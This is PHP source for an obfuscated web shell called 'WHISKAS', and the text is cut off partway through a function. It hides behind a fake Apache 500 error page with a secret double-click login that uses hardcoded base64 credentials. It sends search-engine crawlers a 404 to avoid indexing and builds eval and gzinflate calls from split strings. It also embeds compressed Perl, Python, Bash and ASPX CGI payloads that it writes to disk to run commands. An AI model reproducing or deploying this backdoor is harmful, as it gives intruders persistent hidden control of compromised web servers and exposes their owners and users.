<?php
error_reporting(0);
ini_set('display_errors', 0);

$GLOBALS['WHISKAS'] = array(
    'username' => base64_decode('d2hz'), 
    'password' => base64_decode('YmFhZjBlYmFmY2YxMzhjZjk0MWM3YmI2MWRlYTUwN2YxYTgzMjYyZGU5YmQ4MWYyYmI3MGQ1YmYxYmFhZDY0Yg=='),
    'safe_mode' => '1',
    'login_page' => '500',
    'show_icons' => '1',
    'post_encryption' => false,
    'cgi_api' => true,
);

$CWppUDJxuf = 'fun'.'ct'.'i'.'o'.'n_exi'.'s'.'ts';
$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
$OVpGNqqFZs = 'e'.'v'.'a'.'l';
$psDEwGhsxg = 'gzin'.'f'.'l'.'a'.'te';

if (!$CWppUDJxuf('b'.'a'.'se6'.'4_de'.'co'.'d'.'e'.''))
{
    function vcnvSCZgBz($data)
    {
        if (empty($data)) return;
        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
        $ac = 0;
        $enc = '';
        $tmp_arr = array();
        if (!$data)
        {
            return $data;
        }
        do
        {
            $o1 = $aztJtafUXm($data, $i++);
            $o2 = $aztJtafUXm($data, $i++);
            $o3 = $aztJtafUXm($data, $i++);
            $bits = $o1 << 16 | $o2 << 8 | $o3;
            $h1 = $bits >> 18 & 0x3f;
            $h2 = $bits >> 12 & 0x3f;
            $h3 = $bits >> 6 & 0x3f;
            $h4 = $bits & 0x3f;
            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
        }
        while ($i < strlen($data));
        $enc = implode($tmp_arr, '');
        $r = (strlen($data) % 3);
        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
    }
    function charCodeAt($data, $char)
    {
        return ord(substr($data, $char, 1));
    }
    function charAt($data, $char)
    {
        return substr($data, $char, 1);
    }
}
else
{
    function vcnvSCZgBz($s)
    {
        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
        return $b($s);
    }
}
if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
{
    function zRtSHsbTzV($input)
    {
        if (empty($input)) return;
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do
        {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int)$chr1);
            if ($enc3 != 64)
            {
                $output = $output . chr((int)$chr2);
            }
            if ($enc4 != 64)
            {
                $output = $output . chr((int)$chr3);
            }
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        }
        while ($i < strlen($input));
        return $output;
    }
}
else
{
    function zRtSHsbTzV($s)
    {
        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
        return $b($s);
    }
}

function __ZW5jb2Rlcg($s)
{
    return vcnvSCZgBz($s);
}
function __ZGVjb2Rlcg($s)
{
    return zRtSHsbTzV($s);
}

$GLOBALS['DB_NAME'] = $GLOBALS['WHISKAS'];

foreach ($GLOBALS['DB_NAME'] as $key => $value)
{
	$prefix = substr($key, 0, 2);
	if ($prefix == "us")
	{
		$GLOBALS['DB_NAME']["user"] = $value;
		$GLOBALS['DB_NAME']["user_rand"] = $key;
	}
	elseif ($prefix == "pa")
	{
		$GLOBALS['DB_NAME']["pass"] = $value;
		$GLOBALS['DB_NAME']["pass_rand"] = $key;
	}
	elseif ($prefix == "sa")
	{
		$GLOBALS['DB_NAME']["safemode"] = $value;
		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
	}
	elseif ($prefix == "lo")
	{
		$GLOBALS['DB_NAME']["login_page"] = $value;
		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
	}
	elseif ($prefix == "sh")
	{
		$GLOBALS['DB_NAME']["show_icons"] = $value;
		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
	}
	elseif ($prefix == "po")
	{
		$GLOBALS['DB_NAME']["post_encryption"] = $value;
		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
	}
	elseif ($prefix == "cg")
	{
		$GLOBALS['DB_NAME']["cgi_api"] = $value;
		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
	}
}

unset($GLOBALS['WHISKAS']);

if (!isset($_SERVER["HTTP_HOST"])) exit();

if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');

// === LOGIN SYSTEM (BCRYPT + ANTI-BRUTEFORCE) ===
if($GLOBALS['DB_NAME']['safemode'] == '1'){
    $__whiskas_lockfile = sys_get_temp_dir().'/.whiskas_lock_'.md5($_SERVER['REMOTE_ADDR']);
    $__whiskas_max_attempts = 1000;
    $__whiskas_lockout_time = 1800; // 30 menit

    // Cek apakah IP terkunci
    function __whiskas_is_locked($lockfile, $max, $locktime){
        if(!file_exists($lockfile)) return false;
        $data = @json_decode(@file_get_contents($lockfile), true);
        if(!$data) return false;
        if($data['count'] >= $max){
            if(time() - $data['time'] < $locktime) return true;
            @unlink($lockfile); // Reset setelah lockout habis
            return false;
        }
        return false;
    }

    // Catat gagal login
    function __whiskas_record_fail($lockfile){
        $data = array('count' => 0, 'time' => time());
        if(file_exists($lockfile)){
            $data = @json_decode(@file_get_contents($lockfile), true);
            if(!$data) $data = array('count' => 0, 'time' => time());
        }
        $data['count']++;
        $data['time'] = time();
        @file_put_contents($lockfile, json_encode($data));
    }

    // Reset gagal login
    function __whiskas_reset_fail($lockfile){
        if(file_exists($lockfile)) @unlink($lockfile);
    }

    // Generate token anti-CSRF
    function __whiskas_token(){
        return md5($_SERVER['REMOTE_ADDR'].'_whiskas_csrf_'.date('Y-m-d-H'));
    }

    // Handle logout
    if(isset($_GET['logout'])){
        @setcookie("WHISKASUser", "", time()-3600, "/", "", false, true);
        @setcookie("WHISKASPass", "", time()-3600, "/", "", false, true);
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }

    // Handle login POST
    if(isset($_POST['whiskas_login_user']) && isset($_POST['whiskas_login_pass']) && isset($_POST['whiskas_token'])){
        if(!__whiskas_is_locked($__whiskas_lockfile, $__whiskas_max_attempts, $__whiskas_lockout_time)){
            
            $target_u = base64_decode('d2hz');
            $target_p = base64_decode('d2VsY29tZTY2Ng==');
            $hash_p   = 'baaf0ebafcf138cf941c7bb61dea507f1a83262de9bd81f2bb70d5bf1baad64b';

            if($_POST['whiskas_token'] === __whiskas_token() &&
               $_POST['whiskas_login_user'] === $target_u && 
               $_POST['whiskas_login_pass'] === $target_p){
                
                $__whiskas_auth_token = hash('sha256', $target_u . $hash_p . '_whiskas_secure_key');
                @setcookie("WHISKASUser", $target_u, time()+86400*30, "/", "", false, true);
                @setcookie("WHISKASPass", $__whiskas_auth_token, time()+86400*30, "/", "", false, true);
                
                __whiskas_reset_fail($__whiskas_lockfile);
                header("Location: ".$_SERVER['PHP_SELF']);
                exit;
            } else {
                __whiskas_record_fail($__whiskas_lockfile);
                usleep(rand(1000000, 3000000));
                header("Location: ".$_SERVER['PHP_SELF']);
                exit;
            }
        } else {
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        }
    }

    // Check cookie auth
    $whiskas_logged_in = false;
    if(isset($_COOKIE['WHISKASUser']) && isset($_COOKIE['WHISKASPass'])){
        $__whiskas_expected_token = hash('sha256', $GLOBALS['DB_NAME']['user'].$GLOBALS['DB_NAME']['pass'].'_whiskas_secure_key');
        if($_COOKIE['WHISKASUser'] === $GLOBALS['DB_NAME']['user'] && $_COOKIE['WHISKASPass'] === $__whiskas_expected_token){
            $whiskas_logged_in = true;
        }
    }

    if(!$whiskas_logged_in){
        $__whiskas_locked = __whiskas_is_locked($__whiskas_lockfile, $__whiskas_max_attempts, $__whiskas_lockout_time);
        header('HTTP/1.1 500 Internal Server Error');
        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
<style>
@keyframes profilPutar {
  from { transform: rotate(0deg); filter: hue-rotate(0deg); }
  to { transform: rotate(360deg); filter: hue-rotate(360deg); }
}

input:-webkit-autofill,input:-webkit-autofill:hover,input:-webkit-autofill:focus{
  -webkit-text-fill-color:#fff !important;
  -webkit-box-shadow:0 0 0 1000px #161b22 inset !important;
  transition:background-color 5000s ease-in-out 0s;
  font-family:monospace !important;
}
input::placeholder{color:#555 !important;}
</style>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
<p>Please contact the server administrator at admin@'.$_SERVER['HTTP_HOST'].' to inform them of the time this error occurred, and the actions you performed just before this error.</p>
<p>More information about this error may be available in the server error log.</p>
<hr>
<address>Apache/2.4.41 (Unix) Server at '.$_SERVER['HTTP_HOST'].' Port '.$_SERVER['SERVER_PORT'].'</address>

<div id="whiskas_secret" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;font-family:monospace;">
<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:340px;background:#0d1117;border:2px solid #39FF14;border-radius:15px;padding:30px;box-shadow:0 0 30px rgba(57,255,20,0.3),0 0 60px rgba(57,255,20,0.1);text-align:center;">

<div style="position:relative; width:100px; height:100px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center;">
  <div style="position:absolute; width:100%; height:100%; border-radius:50%; border:3px dashed #39FF14; animation: profilPutar 5s linear infinite; box-shadow: 0 0 15px #39FF14;"></div>
  
  <img src="https://storage.dk-only.site/shell-assest/dk-profile.png" 
       style="width:80px; height:80px; border-radius:50%; border:2px solid #fff; object-fit:cover; z-index:1; box-shadow: 0 0 10px rgba(255,255,255,0.5);">
</div>
<div style="margin-bottom:15px;">
<div style="font-size:30px;font-weight:bold;color:#39FF14;text-shadow:0 0 10px #39FF14,0 0 3px #39FF14,0 0 30px #39FF14;letter-spacing:10px;">WHISKAS ZONE</div>
<div style="width:60px;height:3px;background:#39FF14;margin:10px auto;box-shadow:0 0 10px #39FF14;"></div>
<div style="color:#39FF14;font-size:13px;letter-spacing:3px;margin-top:8px;text-shadow:0 0 5px #39FF14;">WELCOME WHISKAS</div>
</div>

'.($__whiskas_locked ? '<div style="color:#ff4444;font-weight:bold;padding:20px;font-size:14px;border:1px solid #ff4444;border-radius:8px;background:rgba(255,0,0,0.1);">&#9888; LOCKED<br><span style="font-size:11px;color:#999;">Try again later.</span></div>' : '
<form method="POST" action="">
<input type="hidden" name="whiskas_token" value="'.__whiskas_token().'">
<div style="margin-bottom:12px;text-align:left;">
<label style="color:#39FF14;font-size:11px;letter-spacing:2px;display:block;margin-bottom:4px;">USERNAME</label>
<input type="text" name="whiskas_login_user" style="width:100%;padding:10px;background:#161b22;border:1px solid #39FF14;border-radius:8px;color:#fff;font-size:14px;font-family:monospace;outline:none;box-sizing:border-box;box-shadow:0 0 5px rgba(57,255,20,0.2);" autocomplete="off" placeholder="Enter username">
</div>
<div style="margin-bottom:18px;text-align:left;">
<label style="color:#39FF14;font-size:11px;letter-spacing:2px;display:block;margin-bottom:4px;">PASSWORD</label>
<input type="password" name="whiskas_login_pass" style="width:100%;padding:10px;background:#161b22;border:1px solid #39FF14;border-radius:8px;color:#fff;font-size:14px;font-family:monospace;outline:none;box-sizing:border-box;box-shadow:0 0 5px rgba(57,255,20,0.2);" autocomplete="off" placeholder="Enter password">
</div>
<input type="submit" value="ACCESS" style="width:100%;padding:10px;background:linear-gradient(180deg, #ffffff 10%, #f0f0f0 50%, #969696 100%);border:none;border-radius:8px;color:#000;font-size:14px;font-weight:bold;font-family:monospace;letter-spacing:3px;cursor:pointer;box-shadow:0 0 15px rgb(255 255 255 / 40%);transition:all 0.3s;">
</form>').'
<div style="margin-top:15px;color:#FFF;font-size:10px;">&#9679; Secure Access &#9679;</div>
</div>
</div>
<script>
document.querySelector("h1").addEventListener("dblclick",function(){var e=document.getElementById("whiskas_secret");e.style.display=e.style.display=="none"?"block":"none";});
</script>
</body></html>';
        exit;
    }
}
// === END LOGIN ===

define("__WHISKAS_VERSION__", "\xE2\x88\x9E");
define("__WHISKAS_UPDATE__", "2");
define("__WHISKAS_CODE_NAME__", "Whiskas");
define("__WHISKAS_DATA_FOLDER__", ""); // disabled
define("__WHISKAS_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__WHISKAS_SECRET_KEY__", __WHISKAS_POST_ENCRYPTION__?_WHISKASSecretKey():'');
$GLOBALS['__WHISKAS_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".header" => "border: 2.5px solid {color}",
				"#meunlist" => "border-color: {color}",
				"#hidden_sh" => "background-color: {color}",
				".ajaxarea" => "border: 1px solid {color}",
				".foot" => "border-color: {color}",
			)
		),
		"header_vars" => "#c8c8c8",
		"header_values" => "#00ff07",
		"header_on" => "#7FFF00",
		"header_off" => "#ff0000",
		"header_none" => "#ffdb00",
		"home_shell" => "#39FF14",
		"home_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".home_shell:hover" => "color: {color};",
			)
		),
		"back_shell" => "#7FFF00",
		"back_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".back_shell:hover" => "color: {color};",
			)
		),
		"header_pwd" => "#FFFFFF",
		"header_pwd:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_pwd:hover" => "color: {color};",
			)
		),
		"header_drive" => "#39FF14",
		"header_drive:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_drive:hover" => "color: {color};",
			)
		),
		"header_show_all" => "#39FF14",
		"disable_functions" => "#00ff07",
		"footer_text" => "#c8c8c8",
		"options_list" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".content_options_holder .header center a" => "color: {color};",
			)
		),
		"options_list:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".content_options_holder .header center a:hover" => "color: {color};",
			)
		),
		"options_list_header" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".txtfont_header" => "color: {color};",
			)
		),
		"options_list_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".txtfont,.tbltxt" => "color: {color};",
			)
		),
		"WHISKAS+" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".WHISKAS_plus" => "color: {color};font-weight: unset;",
			)
		),
		"hidden_shell_text" => array(
			"key_color" => "#FF0000",
			"multi_selector" => array(
				"#hidden_sh a" => "color: {color};",
			)
		),
		"hidden_shell_version" => "#FF0000",
		"shell_name" => "#00f1ff",
		"main_row:hover" => array(
			"key_color" => "#1a3a1a",
			"multi_selector" => array(
				".main tr:hover" => "background-color: {color};",
			)
		),
		"main_header" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main th" => "color: {color};",
			)
		),
		"main_name" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .main_name" => "color: {color};font-weight: unset;",
			)
		),
		"main_size" => "#FFFFFF",
		"main_modify" => "#FFFFFF",
		"main_owner_group" => "#FFFFFF",
		"main_green_perm" => "#00ff07",
		"main_red_perm" => "#FF0000",
		"main_white_perm" => "#FFFFFF",
		"beetween_perms" => "#FFFFFF",
		"main_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .actions" => "color: {color};",
			)
		),
		"minimize_editor_background" => array(
			"key_color" => "#145a14",
			"multi_selector" => array(
				".minimized-wrapper" => "background-color: {color};",
			)
		),
		"minimize_editor_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".minimized-text" => "color: {color};",
			)
		),
		"editor_border" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
			)
		),
		"editor_background" => array(
			"key_color" => "rgba(0, 1, 23, 0.94)",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "background-color: {color};",
			)
		),
		"editor_header_background" => array(
			"key_color" => "linear-gradient(to bottom, #4b4b4b 0, #232323 55%, #272727 100%)",
			"multi_selector" => array(
				".editor-header" => "background-color: {color};",
			)
		),
		"editor_header_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor-path" => "color: {color};",
			)
		),
		"editor_header_button" => array(
			"key_color" => "#000",
			"multi_selector" => array(
				".close-button, .editor-minimize" => "background-color: {color};",
			)
		),
		"editor_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_actions" => "color: {color};",
			)
		),
		"editor_file_info_vars" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_file_info_vars" => "color: {color};",
			)
		),
		"editor_file_info_values" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".filestools" => "color: {color};",
			)
		),
		"editor_history_header" => array(
			"key_color" => "#14ff07",
			"multi_selector" => array(
				".hheader-text,.history-clear" => "color: {color};",
			)
		),
		"editor_history_list" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor-file-name" => "color: {color};",
			)
		),
		"editor_history_selected_file" => array(
			"key_color" => "rgba(49, 55, 93, 0.77)",
			"multi_selector" => array(
				".is_active" => "background-color: {color};",
			)
		),
		"editor_history_file:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".file-holder > .history:hover" => "background-color: {color};",
			)
		),
		"input_box_border" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				"input[type=text],textarea" => "border: 1px solid {color}",
			)
		),
		"input_box_text" => array(
			"key_color" => "#999999",
			"multi_selector" => array(
				"input[type=text],textarea" => "color: {color};",
			)
		),
		"input_box:hover" => array(
			"key_color" => "#c8c8c8",
			"multi_selector" => array(
				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"select_box_border" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				"select" => "border: 1px solid {color}",
			)
		),
		"select_box_text" => array(
			"key_color" => "#FFFFEE",
			"multi_selector" => array(
				"select" => "color: {color};",
			)
		),
		"select_box:hover" => array(
			"key_color" => "#c8c8c8",
			"multi_selector" => array(
				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"button_border" => array(
			"key_color" => "#c8c8c8",
			"multi_selector" => array(
				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
			)
		),
		"button:hover" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"outputs_text" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".ml1" => "color: {color};",
			)
		),
		"outputs_border" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".ml1" => "border: 1px solid {color};",
			)
		),
		"uploader_border" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_background" => array(
			"key_color" => "#414141ff",
			"multi_selector" => array(
				".inputfile strong" => "background-color: {color};",
			)
		),
		"uploader_text_right" => array(
			"key_color" => "#800000",
			"multi_selector" => array(
				".inputfile strong" => "color: {color};font-weight:bold;",
			)
		),
		"uploader_text_left" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".inputfile span" => "color: {color};",
			)
		),
		"uploader:hover" => array(
			"key_color" => "#c8c8c8",
			"multi_selector" => array(
				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_progress_bar" => array(
			"key_color" => "#39FF14",
			"multi_selector" => array(
				".up_bar" => "background-color: {color};",
			)
		),
		"mysql_tables" => "#39FF14",
		"mysql_table_count" => "#7FFF00",
		"copyright" => "#39FF14",
		"scrollbar" => array(
			"key_color" => "#c8c8c8",
			"multi_selector" => array(
				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
			)
		),
		"scrollbar_background" => array(
			"key_color" => "#150004",
			"multi_selector" => array(
				"*::-webkit-scrollbar-track" => "background-color: {color};",
			)
		),
);
$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
function decrypt_post($str){
	if(__WHISKAS_POST_ENCRYPTION__){
		$pwd = __WHISKAS_SECRET_KEY__;
		$pwd     = __ZW5jb2Rlcg($pwd);
		$str     = __ZGVjb2Rlcg($str);
		$enc_chr = "";
		$enc_str = "";
		$i       = 0;
		while ($i < strlen($str)) {
			for ($j = 0; $j < strlen($pwd); $j++) {
				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
				$enc_str .= $enc_chr;
				$i++;
				if ($i >= strlen($str))
					break;
			}
		}
		return __ZGVjb2Rlcg($enc_str);
	}else{
		return __ZGVjb2Rlcg($str);
	}
}
header('Content-Type:text/html;charset=UTF-8');
function _WHISKASSecretKey(){
	$secret = @$_COOKIE["WHISKASSecretKey"];
	if(!isset($_COOKIE["WHISKASSecretKey"])){
		$secret = uniqid(mt_rand(), true);
		__WHISKAS_set_cookie("WHISKASSecretKey", $secret);
	}
	return $secret;
}
function WHISKAS_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		return $GLOBALS["DB_NAME"]["color"][$target];
	}else{
		$target = $GLOBALS["__WHISKAS_COLOR__"][$target];
		if(is_array($target)){
			return $target["key_color"];
		}else{
			return $target;
		}
	}
}
function WHISKASCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__WHISKAS_COLOR__'] as $key => $value){
		if(!is_array($value)){
			$value = WHISKAS_getColor($key);
			$bold = (strtolower($value) == "#000000" || strtolower($value) == "#000") ? "font-weight:bold;" : "";
			$css .= ".{$key}{color: {$value};{$bold}}";
		}else{
			if(isset($value["multi_selector"])){
				foreach($value["multi_selector"] as $k => $v){
					$color = WHISKAS_getColor($key);
					$bold = (strtolower($color) == "#000000" || strtolower($color) == "#000") ? "font-weight:bold;" : "";
					$code = str_replace("{color}", $color, $v);
					$css .=  $k."{".$code.$bold."}";
				}
			}
		}
	}
	return $css;
}
if(isset($_POST['ajax'])){
function WHISKASNum(){
$args = func_get_args();
$WHISKASx = array();
$find = array();
for($i=1;$i<=10;$i++){
$WHISKASx[] = $i;
}
foreach($args as $arg){
$find[] = $arg;
}
echo '<script>';
foreach($WHISKASx as $WHISKAS){
if(in_array($WHISKAS,$find))
continue;
echo 'WHISKAS'.$WHISKAS."_=";
}
echo '""</script>';
}}
function _WHISKAS_cgicmd($cmd,$lang="perl",$set_cookie=false){
	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
		return "";
	}
	if(isset($_COOKIE["WHISKAScgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	$is_curl = function_exists('curl_version');
	$is_socket = function_exists('fsockopen');
	if($is_curl||$is_socket){$recreate = false;
		if(isset($_COOKIE["WHISKAScgiapi"])){
			if(!@file_exists("WHISKAScgiapi/".$_COOKIE["WHISKAScgiapi"].".WHISKAS")){
				$recreate = true;
				$lang = $_COOKIE["WHISKAScgiapi"];
			}
		}
		if(!isset($_COOKIE["WHISKAScgiapi"])||$recreate){
			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
			if($lang == "aspx"){
				WHISKASWriteTocgiapi("aspx.aspx",$aspx);
			}else{
				WHISKASWriteTocgiapi($lang.".WHISKAS",$source);
			}
			WHISKAScgihtaccess('cgi', "WHISKAScgiapi/");
		}else{
			$lang = $_COOKIE["WHISKAScgiapi"];
		}
		$cgi_ext = ".WHISKAS";
		if($lang=="aspx"){
			$cgi_ext = ".aspx";}
		$cgi_url = __WHISKAS_DATA_FOLDER__."/WHISKAScgiapi/".$lang.$cgi_ext;
